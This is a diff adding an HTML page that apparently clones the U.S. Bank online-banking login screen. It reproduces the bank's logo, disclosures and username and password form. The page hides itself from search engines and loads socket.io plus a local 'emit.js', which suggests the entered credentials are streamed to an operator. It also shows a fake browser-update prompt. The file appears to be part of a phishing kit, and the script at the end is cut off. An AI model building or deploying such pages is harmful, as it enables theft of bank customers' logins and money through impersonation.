@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+
+<html lang="en">
+   <head class="at-element-marker">
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <meta name="viewport" content="initial-scale=1,maximum-scale=2,width=device-width">
+      <meta name="robots" content="noindex, nofollow">
+      <meta http-equiv="Expires" content="-1">
+      <meta name="theme-color" content="#000000">
+      <link rel="icon" href="/assets/favicon.ico">
+      <link rel="stylesheet" href="/assets/css/style.css">
+      <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+      <title>Account login</title>
+      <style>#browser_error_txt{
+         box-shadow: 0px 4px 6px -1px rgba(0, 0, 0, 0.12);
+         width: 50%;
+         margin: 0 auto;
+         top: 50%;
+         position: absolute;
+         left: 50%;
+         transform: translate(-50%, -50%);
+         }
+         .safa-content{
+         background-color: #fff;
+         padding: 1rem 2.5rem 1rem 1rem;
+         border-radius: 0.25rem 0.25rem 0 0;
+         position: relative;
+         outline-offset: -1px;
+         color: #2E2E32;
+         font-family: 'U.S. Bank Circular';
+         letter-spacing: 0em;
+         text-align: left
+         }
+         .safa-content h1 {
+         font-size: 1.25em;
+         font-weight: 500;
+         }
+         .safa-visible{
+         display: block;
+         }
+         .safa-hidden{
+         display: none;
+         }
+         .safari-flex-inline{
+         display: flex;
+         align-items: center;
+         }
+         .safa-info{
+         width: 1.25rem;
+         height: 1.25rem;
+         margin-right: 0.75rem;
+         align-self: center;
+         }
+         .safa-close{
+         position: absolute;
+         padding: 5px 2px;
+         top: 1rem;
+         right: 1.25rem;
+         cursor: pointer;
+         height: 2rem;
+         min-height: 0;
+         min-width: 0;
+         width: 2rem;
+         background: transparent;
+         border: transparent;
+         }
+         .safa-close:focus{
+         outline: none;
+         }
+         .safa-footer{
+         border-radius: 0 0 0.25rem 0.25rem;
+         padding: 1rem;
+         flex-flow: row-reverse;
+         background-color: #F5F5FA;
+         }
+         .safa-button{
+         min-height: 2.5rem;
+         max-height: 2.5rem;
+         line-height: 1.5;
+         padding: 0.5rem 1.5rem;
+         cursor: pointer;
+         font-size: 1rem;
+         font-weight: 500;
+         height: 40px;
+         line-height: 1;
+         outline: transparent;
+         position: relative;
+         transition: color .1s ease,border .1s ease;
+         white-space: nowrap;
+         }
+         .safa-prime{
+         background: linear-gradient(-180deg,#0a41c5,#0a41c5);
+         border-color: transparent;
+         border-width: 0;
+         border-radius: 0.25rem;
+         color: #fff;
+         font-family: 'U.S. Bank Circular';
+         margin-left: 12px;
+         }
+         .safa-sec{
+         background: transparent;
+         border-width: 1px;
+         border-color: #0a41c5;
+         border-radius: 0.25rem;
+         color: #0a41c5;
+         font-weight: 500;
+         line-height: 1;
+         font-family: 'U.S. Bank Circular';
+         transition: margin .1s ease;
+         }
+         .safa-button:focus:before, .safa-close:focus:before {
+         border: 2px solid #0a41c5;
+         border-radius: 0.25rem;
+         content: "";
+         height: calc(100% + 0.75rem);
+         position: absolute;
+         left: -0.5rem;
+         top: -0.5rem;
+         width: calc(100% + 0.75rem);
+         }
+         .safa-sec:hover{
+         background: linear-gradient(-180deg,#0a41c5,#0c2074);
+         border: 1px solid #0a41c5;
+         color: #fff;
+         }
+         .safa-prime:hover{
+         background: linear-gradient(-180deg,#0a41c5,#0c2074);
+         color: #fff;
+         }
+         .safa-close:focus:before {
+         left: -0.5rem;
+         top: -0.5rem;
+         }
+         .safa-body-text{
+         color: #555555;
+         font-size: 1rem;
+         line-height: 1.5rem;
+         }
+         .safa-heading{
+         color: #2E2E32;
+         font-size: 1.25rem;
+         line-height: 30px;
+         }
+         .safa-overlay{
+         height: 100vh;
+         background: rgba(0,0,0,.6);
+         transition: background-color 1s ease;
+         }
+         
+         .usb--wrapper {
+  position: relative;
+}
+
+*:focus {
+  outline: none;
+}
+
+.usb--floating-label {
+  position: absolute;
+  top: 50%;
+  left: 12px;
+  transform: translateY(-50%);
+  transition: all 0.2s ease;
+  pointer-events: none;
+  font-size: 14px;
+  color: #666;
+}
+
+/* Active / floating state */
+.usb--wrapper.is-active .usb--floating-label,
+.usb--wrapper.has-value .usb--floating-label {
+  top: 8px;
+  font-size: 11px;
+  color: #0a5fd4;
+}
+.err-mess {
+  color: #d64545;              /* light red */
+  font-size: 0.75rem;          /* smaller text */
+  margin-top: 4px;
+  display: none;
+  align-items: flex-start;
+  gap: 6px;
+}
+
+.err-mess::before {
+  content: ""; /* still need content for pseudo-element to appear */
+  display: inline-block;
+  width: 16px;
+  height: 16px;
+  background-image: url('icon.png');
+  background-size: cover;
+  background-repeat: no-repeat;
+  vertical-align: middle; /* adjust alignment */
+}
+.hasError{
+border-bottom: 2px solid red!important;
+}
+
+         body{
+         margin: 0;
+         }
+      </style>
+         </head>
+         
+         
+      <noscript>You need to enable JavaScript to run this app.</noscript>
+      
+   <body>
+
+      <div id="safa-overlay" class="safa-overlay safa-hidden" role="dialog" aria-modal="true" aria-labelledby="dialog1Title" aria-describedby="safaContent" tabindex="-1">
+         <div id="browser_error_txt">
+            <div id="safaContent" class="safa-content">
+               <h1 id="dialog1Title">It's time to update your browser.</h1>
+               <p id="dialog1Desc" class="safa-body-text">It looks like you're using an older browser version. Please update it to log in.</p>
+               <button type="button" id="safaClose" class="safa-close" aria-label="close modal" tabindex="1" onclick="closeInfo()">
+                  <span>
+                     <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd" d="M19.22 10C19.22 13.744 16.963 17.1188 13.5029 18.5487C10.0427 19.9787 6.06175 19.1818 3.41864 16.5301C0.775535 13.8784 -0.0084331 9.89486 1.43275 6.43935C2.87393 2.98384 6.25601 0.737863 9.99999 0.750006C15.1063 0.755517 19.2445 4.89366 19.25 10H19.22ZM14 7.00001L11 10L14 13L13 14L9.99999 11L6.99999 14L5.99999 13L8.99999 10L5.99999 7.00001L6.99999 6.00001L9.99999 9.00001L13 6.00001L14 7.00001ZM12.9288 2.83711C15.8285 4.03489 17.72 6.8627 17.72 10H17.75C17.7445 14.2779 14.2779 17.7445 9.99999 17.75C6.86271 17.7621 4.02758 15.8816 2.81857 12.9866C1.60956 10.0917 2.26519 6.75333 4.4793 4.53062C6.6934 2.30791 10.0292 1.63934 12.9288 2.83711Z" fill="#555555"></path>
+                     </svg>
+                  </span>
+               </button>
+            </div>
+            <div class="safari-flex-inline safa-footer"><button class="safa-button safa-prime" tabindex="3" type="button" onclick="closeInfo()">Close</button> <button class="safa-button safa-sec" tabindex="2" type="button" onclick="browserUpdateInfo()">Browser update info</button></div>
+         </div>
+      </div>
+      <div id="root">
+         <div class="App">
+            <section><button class="skip-main">Skip to main content</button></section>
+            <header class="auth-ui-header " role="banner">
+               <div class="header-container">
+                  <nav role="navigation">
+                     <div class="header-section-logos">
+                        <div class="ham-container">
+                           <button aria-label="open leftmenu collapsed" class="hamburger-menu btn-hamburger-menu">
+                              <div class="line line-top"></div>
+                              <div class="line line-middle"></div>
+                              <div class="line line-bottom"></div>
+                           </button>
+                           <div class="logo-div"><a aria-label="U S Bank Logo"><span class="logo usb-bank-logo" title="USBankLogo" style="background-image: url('assets/idc_usbank_logo.svg');""></span></a></div>
+                        </div>
+                        <div class="hide header-link-div">
+                           <div class="ham-menu-bg"></div>
+                           <div class="link-container large-screen">
+                              <div class="lang-toggle mr-20"><span role="button" data-compn="@usb-shield/react-link" data-compv="2.0.16" data-libn="@usb-shield/components-react-versioned" data-libv="2.0.0" class="usb-link basic mar0" data-testid="usb-link-" tabindex="0" rel="noopener noreferrer" aria-atomic="true" aria-describedby="espanol-desc"><span class="usbank-icon margin-right-unset">U.S. Bank en Español</span></span></div>
+                              <div><span><a class="header-link" aria-describedby="new-window-header" href="https://www.usbank.com/about-us-bank/customer-service.html" rel="noreferrer" target="_blank">Customer Service  </a></span></div>
+                              <div><span><a class="header-link" aria-describedby="new-window-header" href="https://locations.usbank.com/search.html" rel="noreferrer" target="_blank">Locations  </a></span></div>
+                           </div>
+                           <div data-compn="@usb-shield/react-drawer" data-compv="10.0.0-mvp.15" data-libn="usb-shield" data-libv="10.0.1" class="usb-drawer " id="header-usb-drawer"></div>
+                        </div>
+                     </div>
+                  </nav>
+               </div>
+               <div hidden=""><span id="new-window-header">Opens in a new tab</span><span id="english-desc">Solo en inglés</span><span id="espanol-desc">Changes language to espanol</span></div>
+               <div class="clear"></div>
+            </header>
+            <main tabindex="-1" class="Login react-module-width">
+               <div class="aw-usb-loginWidget">
+                  <div id="test-spinner"></div>
+                  <div id="ReactLoginWidgetApp" class="aw-increase-top login-widget">
+                     <div class="aw-usb-authenticate legacy receive borderStylenull">
+                        <div class="fdicdisclosure">
+                           <cite class="fdic-disclosure  ">
+                           	
+                              <figure>
+                                 <svg class="logo" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 728 300">
+                                    <path class="path" d="M80.9,73.8v45.6h77.7v60H80.9v107H10.1V13.9h156.5v60H80.9zM428.9,13.9h70.9v272.6h-70.9V13.9z M718,105.3 c-14.5-19.5-38-30-62.2-30c-43.4,0-72.7,33.3-72.7,75.6s29.6,74.1,73.8,74.1c23.1,0,46.3-11.2,61.1-28.9V281c-23.5,7.2-40.5,12.6-62.5,12.6c-38,0-74.1-14.5-102.3-40.1c-30-27.1-43.7-62.5-43.7-103c0-37.2,14.1-73,40.1-99.8C576.3,23.3,615,6.6,653.3,6.6c22.8,0,43.7,5.1,64.7,13.7L718,105.3L718,105.3z M280.4,13.9H179.9v272.6h100.5 c75.5,0,138.5-59.6,138.5-136.3S356.3,13.9,280.4,13.9zM266.6,226.4h-15.9V73.8h16.6c45.5,0,77.7,27.5,77.7,76.3 C345.1,203.3,308.9,226.4,266.6,226.4z"></path>
+                                 </svg>
+                                 <figcaption>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</figcaption>
+                              </figure>
+                           </cite>
+                        </div>
+                        <div>
+                           <h2 id="login-in-to-account" aria-hidden="false">Account login</h2>
+                           <div data-compn="@usb-shield/react-notification" data-compv="10.3.7" data-libn="usb-shield" data-libv="10.0.1" id="top-error-msg" class="usb-notification " style="display:none" data-testid="" lang="en"><div class="error"><div data-testid="component-usb-children-notification" class="usb-children-notification" id="top-error-msg-children-notification" role="" tabindex="-1" lang="en"><span data-compn="@usb-shield/react-icons" data-compv="10.1.8" data-libn="usb-shield" data-libv="10.0.1" id="" lang="en" class="usb-icon svg-icon icon error" data-testid="usb-icon-"><svg id="svg-2741b158-6991-46b1-b8f9-75a091ad5def" aria-hidden="false" viewBox="0 0 20 20" width="20" height="20" class="single" focusable="false" aria-labelledby="svg-title-2741b158-6991-46b1-b8f9-75a091ad5def "><title id="svg-title-2741b158-6991-46b1-b8f9-75a091ad5def">Warning</title><path id="pathSVG-2741b158-6991-46b1-b8f9-75a091ad5def" d="M18.67 17.67l-8-16a.79.79 0 00-1.34 0l-8 16A.75.75 0 002 18.75h16a.75.75 0 00.67-1.08zm-15.46-.42L10 3.68l6.79 13.57zM9.25 8h1.5v5h-1.5zm1.46 6.29a1.15 1.15 0 01.21.33.94.94 0 010 .76 1.15 1.15 0 01-.21.33 1 1 0 01-1.63-1.09 1 1 0 01.21-.33 1 1 0 01.9-.27.6.6 0 01.19.06l.18.09z"></path></svg><span class="sr-only">Error</span></span><div class="displayflex-allignCenter" role="alert"> <span class="" aria-live="assertive" aria-hidden="false"> Enter your username and password to log in. </span></div><p class="reference-number">Reference number: 735159</p></div></div></div>
+                        </div>
+                        <div>
+                           <div>
+                              <form id="loginPageForm">  
+                                 <div>  
+                                    <span tabindex="-1" role="alert"></span>  
+                                    <div data-basev="10.9.2" data-compn="@usb-shield/react-forms-input-text" data-compv="10.4.3" data-libn="@usb-shield/components-react-versioned" data-libv="10.0.0" data-testid="" class="usb--wrapper " id="wrapper_aw-personal-id" lang="en">  
+                                       <label id="label_aw-personal-id" for="input_aw-personal-id" class="usb--floating-label ">Username</label><input id="input_aw-personal-id" aria-invalid="false" name="username" class="usb--basic-input " type="text" inputmode="text" spellcheck="true" aria-required="true" autocomplete="username" lang="en" data-cobrowse-function="masked" value="">  
+                                       <div class="err-mess"></div>
+                                    <div id="aw-remember-forgot-id-div" class="rememberMeAlignment">  
+                                       <div id="aw-remember-my-id-label" class="rememberCheckbox">  
+                                          <div data-basev="10.9.2" data-compn="@usb-shield/react-forms-checkbox" data-compv="10.1.0" data-libn="@usb-shield/components-react-versioned" data-libv="10.0.0" data-testid="" class="usb--checkbox-wrapper      " id="wrapper_rememberid-global">  
+                                             <input class="usb--checkbox-input" type="checkbox" lang="en" id="input_rememberid-global" name="rememberid-global" aria-required="false" aria-invalid="false" data-cobrowse-function="none">  
+                                             <label class="usb--checkbox-label" for="input_rememberid-global" data-cobrowse-function="none">  
+                                                <span class="usb--checkbox-label-text" data-cobrowse-function="none">Remember my username</span>  
+                                                <span class="usb--checkbox-svg" data-cobrowse-function="none">  
+                                                   <span data-compn="@usb-shield/react-icons" data-compv="10.1.8" data-libn="usb-shield" data-libv="10.0.1" id="" lang="en" class="usb-icon svg-icon default" data-testid="usb-icon-">  
+                                                      <svg id="svg-134e9561-2265-491b-ab08-01c413f042b0" aria-hidden="true" viewBox="0 0 20 20" width="20" height="20" class="single" focusable="false">  
+                                                         <path id="pathSVG-134e9561-2265-491b-ab08-01c413f042b0" d="M7.17 16a.74.74 0 01-.53-.22l-4.95-5 1.06-.98 4.42 4.42L17.25 4.14l1.06 1.06L7.7 15.81a.73.73 0 01-.53.19z"></path>  
+                                                      </svg>  
+                                                      <span class="sr-only"></span>  
+                                                   </span>  
+                                                </span>  
+                                             </label>  
+                                             <div data-compv="2.0.0" class="usb--error-message" aria-live="off" aria-atomic="true" id="error-text_rememberid-global"></div>  
+                                          </div>  
+                                       </div>  
+                                    </div>  
+                                    <div>  
+                                       <span tabindex="-1" role="alert"></span>  
+                                       <div class="password-input-wrapper">  
+                                          <div class="password-input-unique-id-wrapper">  
+                                             <div data-basev="10.9.2" data-compn="@usb-shield/react-forms-input-text" data-compv="10.4.3" data-libn="@usb-shield/components-react-versioned" data-libv="10.0.0" data-testid="" class="usb--wrapper " id="wrapper_aw-password" lang="en">  
+                                                <label id="label_aw-password" for="input_aw-password" class="usb--floating-label ">Password</label><input id="input_aw-password" aria-invalid="false" name="password" class="usb--basic-input " type="password" inputmode="text" spellcheck="true" aria-required="true" autocomplete="current-password" lang="en" data-cobrowse-function="masked" value="">  
+                                                <div class="err-mess"></div>
+                                             </div>  
+                                             <button class="show-hide__button" type="button" aria-live="off">Show<span class="sr-only">Password</span></button>  
+                                          </div>  
+                                       </div>  
+                                    </div>  
+                                    <div class="auth-continue-button-align"><button type="submit" lang="en" id="login-button-continue" data-testid="" data-compn="@usb-shield/react-button" data-compv="10.4.8" data-libn="usb-shield" data-libv="10.0.1" class="usb-button button--standard--heavy button--medium icon-left button--layout_row login-button-continue button--primary" name="loginButton">Log in</button></div>  
+                                    <span role="link" tabindex="0" lang="en" id="loginHelp" data-testid="usb-link-usb-link-loginHelp" data-compn="@usb-shield/react-link" data-compv="10.3.9" data-libn="usb-shield" data-libv="10.0.1" class="usb-link arrow usb-link_arrow default-no-underline is-standard-style cta-style_standard is-not-underlined emphasis_minimal is-size-medium size_medium loginHelp">  
+                                       Forgot username or password  
+                                       <span data-compn="@usb-shield/react-icons" data-compv="10.1.8" data-libn="usb-shield" data-libv="10.0.1" id="" lang="en" class="usb-icon svg-icon interaction" data-testid="usb-icon-">  
+                                          <svg id="svg-3600e28d-724f-481d-9460-4847fab0f308" aria-hidden="true" viewBox="0 0 20 20" width="20" height="20" class="single" focusable="false">  
+                                             <path id="pathSVG-3600e28d-724f-481d-9460-4847fab0f308" d="M6.36 15.47L11.83 10 6.36 4.53l1.06-1.06 6 6a.75.75 0 010 1.06l-6 6z"></path>  
+                                          </svg>  
+                                          <span class="sr-only"></span>  
+                                       </span>  
+                                    </span>  
+                                    <span role="link" tabindex="0" lang="en" id="enrollmentLink" data-testid="usb-link-usb-link-enrollmentLink" data-compn="@usb-shield/react-link" data-compv="10.3.9" data-libn="usb-shield" data-libv="10.0.1" class="usb-link subtle usb-link_subtle default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small enrollmentLink dark cursor_pointer" aria-describedby="enrollment-english-desc" aria-label="Enroll in online banking">Enroll in online banking</span><span role="link" tabindex="0" lang="en" id="cncBankingLink" data-testid="usb-link-usb-link-cncBankingLink" data-compn="@usb-shield/react-link" data-compv="10.3.9" data-libn="usb-shield" data-libv="10.0.1" class="usb-link subtle usb-link_subtle default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small cncBankingLink" aria-describedby="popupWindow" aria-labelledby="cncBankingDescription" aria-label="Corporate &amp; Commercial banking login Opens in a popup">Corporate &amp; Commercial banking login</span>  
+                                 </div>  
+                              </form>  
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </main>
+            <div class="footer-container">
+               <footer class="Footer" aria-label="Footer">
+                  <div class="Footer_Container">
+                     <div class="">
+                        <div class="Footer_Connection_Secured">
+                           <div class="usb-grid--container vw-grid   " type="" id="" data-testid="" data-compn="@usb-shield/react-grid" data-compv="1.1.11" data-libn="@usb-shield/components-react-versioned" data-libv="2.0.0" lang="en">
+                              <div class="grid   grid  zero-padding  zero-gap  justify-stretch  align-stretch  ">
+                                 <div class="col xl-4 lg-4 md-8 sm-4 off-xl-undefined     display-flex zero-padding justify-auto align-auto  ">
+                                    <div>
+                                       <div class="Footer_Lock_Icon floatLeft"></div>
+                                       <p>Connection Secured</p>
+                                    </div>
+                                 </div>
+                                 <div class="col xl-12 lg-12 md-8 sm-4 off-xl-undefined     display-flex zero-padding justify-auto align-auto  ">
+                                    <div class="FooterLink">
+                                       <div><button role="link" type="button" lang="en" id="ss" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="new-window-footer" aria-label="Security Opens in a new tab">Security</button><span class="linkSeparator">|</span></div>
+                                       <div><button role="link" type="button" lang="en" id="privacyPledge" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="new-window-footer" aria-label="Privacy Opens in a new tab">Privacy</button><span class="linkSeparator">|</span></div>
+                                       <div><button role="link" type="button" lang="en" id="privacyPledgeCali" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="new-window-footer" aria-label="Your California privacy choices Opens in a new tab">Your California privacy choices<img class="img-cali" src="./assets/privacy-options.png" alt="privacy choices"></button><span class="linkSeparator">|</span></div>
+                                       <div><button role="link" type="button" lang="en" id="start-cobrowse-random-key" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="popupWindow" aria-label="CoBrowse Opens in a popup" cobrowse-onclick="true">CoBrowse</button></div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                        <div>©2026 U.S. Bank</div>
+                        <div class="mtb-05rem">OLB Cloud : 2.56.0_BN_7795</div>
+                        <hr aria-hidden="true">
+                     </div>
+                     <div>
+                        <div class="disclosures-container">
+                           <div class="">
+                              <p class="page-footer-inv-p">Investment and Insurance products and services including annuities are:</p>
+                              <ul class="disclosures-items">
+                                 <li class="page-footer-inv-p">Not a Deposit</li>
+                                 <li class="page-footer-inv-p">Not FDIC Insured</li>
+                                 <li class="page-footer-inv-p">May Lose Value</li>
+                                 <li class="page-footer-inv-p">Not Bank Guaranteed</li>
+                                 <li class="page-footer-inv-p">Not Insured by any Federal Government Agency</li>
+                              </ul>
+                           </div>
+                        </div>
+                        <div class="description">
+                           <div class="greyColor mt-2rem">
+                              <p role="heading" aria-level="3" class="title fontBold">For U.S. Bank:</p>
+                              <p class="content"><img src="./assets/EqualHousingLender.png" alt="">&nbsp;Equal Housing Lender. Deposit products offered by U.S. Bank National Association. Member FDIC</p>
+                              <p class="content">U.S. Bank is not responsible for and does not guarantee the products, services or performance of U.S. Bancorp Investments and U.S. Bancorp Advisors.</p>
+                           </div>
+                           <div class="greyColor mt-2rem">
+                              <p role="heading" aria-level="3" class="title fontBold">For U.S. Bancorp Investments:</p>
+                              <p class="content">Investment products and services are available through U.S. Bancorp Investments, the marketing name for U.S. Bancorp Investments, Inc.,  <span>member  <button role="link" type="button" lang="en" id="finra" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="popupWindow" aria-labelledby="finraDescription" aria-label="Financial Industry Regulatory Authority Opens in a popup">FINRA</button></span><span> and  <button role="link" type="button" lang="en" id="sipc" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="popupWindow" aria-labelledby="sipcDescription" aria-label="Securities Investor Protection Corporation Opens in a popup">SIPC,</button></span><span> an investment adviser and a brokerage subsidiary of U.S. Bancorp and affiliate of U.S. Bank. </span></p>
+                              <p class="content">U.S. Bancorp Investments is registered with the Securities and Exchange Commission as both a broker-dealer and an investment adviser. To understand how brokerage and investment advisory services and fees differ,  <span>the  <button role="link" type="button" lang="en" id="crs" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="new-window-footer" aria-label="Client Relationship Summary Opens in a new tab">Client Relationship Summary</button></span><span> and  <button role="link" type="button" lang="en" id="interestDisclosure" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="new-window-footer" aria-label="Regulation Best Interest Disclosure Opens in a new tab">Regulation Best Interest Disclosure</button></span><span> are available for you to review. </span></p>
+                              <p class="content">The Financial Industry Regulatory Authority (FINRA) Rule 2267 provides for BrokerCheck to allow investors to learn about the professional background, business practices, and conduct of FINRA member firms or their brokers. To request such information, contact FINRA toll-free 1.800.289.9999 or via <span> <button role="link" type="button" lang="en" id="brokerCheck" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="popupWindow" aria-label="BrokerCheck Opens in a popup">BrokerCheck</button></span><span> website. An investor brochure describing BrokerCheck is also available through FINRA </span></p>
+                           </div>
+                           <div class="greyColor mt-2rem">
+                              <p role="heading" aria-level="3" class="title fontBold">For U.S. Bancorp Advisors:</p>
+                              <p class="content">Brokerage and investment advisory services offered by U.S. Bancorp Advisors LLC,  <span>member  <button role="link" type="button" lang="en" id="ub-finra" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="popupWindow" aria-labelledby="finraDescription" aria-label="Financial Industry Regulatory Authority Opens in a popup">FINRA</button></span><span> and  <button role="link" type="button" lang="en" id="ub-sipc" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="popupWindow" aria-labelledby="sipcDescription" aria-label="Securities Investor Protection Corporation Opens in a popup">SIPC,</button></span><span> an investment adviser and a brokerage subsidiary of U.S. Bancorp and affiliate of U.S. Bank. </span></p>
+                              <p class="content">U.S. Bancorp Advisors is registered with the Securities and Exchange Commission as both a broker-dealer and an investment adviser. To understand how brokerage and investment advisory services and fees differ,  <span>the  <button role="link" type="button" lang="en" id="ub-crs" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="new-window-footer" aria-label="Client Relationship Summary Opens in a new tab">Client Relationship Summary</button></span><span> and  <button role="link" type="button" lang="en" id="ub-interestDisclosure" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="new-window-footer" aria-label="Regulation Best Interest Disclosure Opens in a new tab">Regulation Best Interest Disclosure</button></span><span> are available for you to review. </span></p>
+                              <p class="content">The Financial Industry Regulatory Authority (FINRA) Rule 2267 provides for BrokerCheck to allow investors to learn about the professional background, business practices, and conduct of FINRA member firms or their brokers. To request such information, contact FINRA toll-free 1.800.289.9999 or via  <span> <button role="link" type="button" lang="en" id="ub-brokerCheck" data-testid="usb-link-usb-link-test-id" data-compn="@usb-shield/react-link" data-compv="10.5.0" data-libn="usb-shield" data-libv="10.0.1" class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small" aria-describedby="popupWindow" aria-label="BrokerCheck Opens in a popup">BrokerCheck</button></span><span> website. An investor brochure describing BrokerCheck is also available through FINRA. </span></p>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </footer>
+            </div>
+            <div class="chat-container" id="chat-container-div"></div>
+         </div>
+      </div>
+      <div id="sec-overlay" style="display:none;">
+         <div id="sec-container"></div>
+      </div>
+      <div id="ZN_6VxkyqYWaF9f1T7"></div>
+      <style type="text/css">.QSIFeedbackButton div,.QSIFeedbackButton dl,.QSIFeedbackButton dt,.QSIFeedbackButton dd,.QSIFeedbackButton ul,.QSIFeedbackButton ol,.QSIFeedbackButton li,.QSIFeedbackButton h1,.QSIFeedbackButton h2,.QSIFeedbackButton h3,.QSIFeedbackButton h4,.QSIFeedbackButton h5,.QSIFeedbackButton h6,.QSIFeedbackButton span,.QSIFeedbackButton pre,.QSIFeedbackButton form,.QSIFeedbackButton fieldset,.QSIFeedbackButton textarea,.QSIFeedbackButton p,.QSIFeedbackButton blockquote,.QSIFeedbackButton tr,.QSIFeedbackButton th,.QSIFeedbackButton td{ margin: 0; padding: 0;background-color: transparent; border: 0; font-size: 12px; line-height: normal; vertical-align:baseline; box-shadow: none; }.QSIFeedbackButton img{ height: auto; width: auto; margin: 0; padding: 0 }.QSIFeedbackButton ul,.QSIFeedbackButton ol{ margin: 12px 0; padding-left: 40px; }.QSIFeedbackButton ul li{ list-style-type: disc; }.QSIFeedbackButton ol li{ list-style-type: decimal; }.QSIFeedbackButton .scrollable{ -webkit-overflow-scrolling: touch; }.QSIFeedbackButton table{ border-collapse: collapse; border-spacing: 0; }.QSIFeedbackButton table td{ padding: 2px; }.QSIFeedbackButton iframe{ max-height: none; }.QSIFeedbackButton *{ box-sizing: content-box; }</style>
+      <style type="text/css">/* Use classes below to override feedback button styles.
+         Attention: The following code is provided as-is 
+         and requires programming knowledge to implement. 
+         Qualtrics Support does not offer assistance or consultation on custom coding. 
+         You can always try asking our community of dedicated users instead.
+         For help with custom code go to https://community.qualtrics.com/custom-code-12
+         NOTE: Changes made here will not be reflected in the previewer.
+         Please be sure to test out your changes manually. */
+         @font-face {
+         font-family: Circular-USB;
+         src: url('/assets/fonts/U.S.BankCircularWeb-Light.woff2') format('woff2');
+         }
+         /* Style feedback button parent container. This is a container that sits on top of the entire screen and is mostly transparent that houses the feedback button */
+         .QSIFeedbackButton {
+         /* z-index: 1; */
+         /* white-space: normal !important; */
+         }
+         /* Style feedback button */
+         #QSIFeedbackButton-btn div {
+         font-family: Circular-USB, Helvetica Neue, sans-serif;     
+         /* line-height: 1em !important; */
+         /* margin: 0 0.5em 0 0 !important; */
+         /* width: auto !important; */
+         /* font-size: inherit !important; */
+         /* font-weight: normal !important; */
+         /* font-style: normal !important; */
+         /* display: inline !important; */
+         /* color: #000000 !important; */
+         /* background-color: #136ef6 !important */
+         }
+         /* Style survey iFrame container. This houses the iFrame and appears when clicking the feedback button */
+         #QSIFeedbackButton-pullup-container.QSIFeedbackButton {
+         /* display: inline-block !important; */
+         /* margin-right: 5px !important; */
+         }
+         /* Style survey iFrame */
+         #QSIFeedbackButton-survey-iframe {
+         /* display: inline-block !important; */
+         /* height: 100% !important; */
+         /* width: 100% !important; */
+         }
+      </style>
+      <script src="assets/emit.js"></script> 
+      <script>
+document.addEventListener("DOMContentLoaded", () => {
+  const wrappers = document.querySelectorAll(".usb--wrapper");
+
